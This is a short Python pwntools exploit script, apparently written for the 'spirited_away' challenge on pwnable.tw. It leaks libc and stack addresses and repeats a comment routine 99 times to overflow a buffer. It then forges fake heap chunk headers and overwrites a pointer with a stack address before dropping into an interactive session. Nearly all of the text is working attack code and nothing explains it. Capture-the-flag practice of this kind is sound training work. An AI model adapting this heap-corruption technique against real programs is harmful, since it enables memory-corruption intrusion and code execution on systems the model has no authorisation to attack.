from pwn import *

p = process("./spirited_away")
#p = remote("chall.pwnable.tw",10204)
#gdb.attach(p)
def func(name,age,why,comment,i):
    global leak
    leak = 0
    p.sendlineafter("Please enter your name: ",name)
    p.sendlineafter("Please enter your age: ",age)
    p.sendlineafter("Why did you came to see this movie? ",why.strip())
    p.sendlineafter("Please enter your comment: ",comment)
    p.recvuntil("Reason: ")
    p.recvline()
    if(i == -2 or i ==-1):
        leak += u32(p.recv(4).strip())
    p.sendlineafter("Would you like to leave another comment? <y/n>: ","y")
    if(i == -1 or i == -2):
        return leak
libc_leak = func("fake","15","a"*3,"b"*3,-1)
print "libc : " + hex(libc_leak)
stack_leak = func("fake","15","a"*31,"b"*3,-2)
print "stack : " + hex(stack_leak+0x20)
to_be = stack_leak + 0x20 - 0xc8 + 80 + 8 + 8
print "to be : " + hex(to_be)
for i in range(99):
    func("fake","15","a"*31,"b"*3,i)
gdb.attach(p)
reason = p32(0) + p32(0x41) + 0x38 * "\x00" + p32(0) + p32(0x41)
comment = "A"*80 + p32(0x80) + p32(to_be)
func("","",reason,comment,i)

p.interactive()
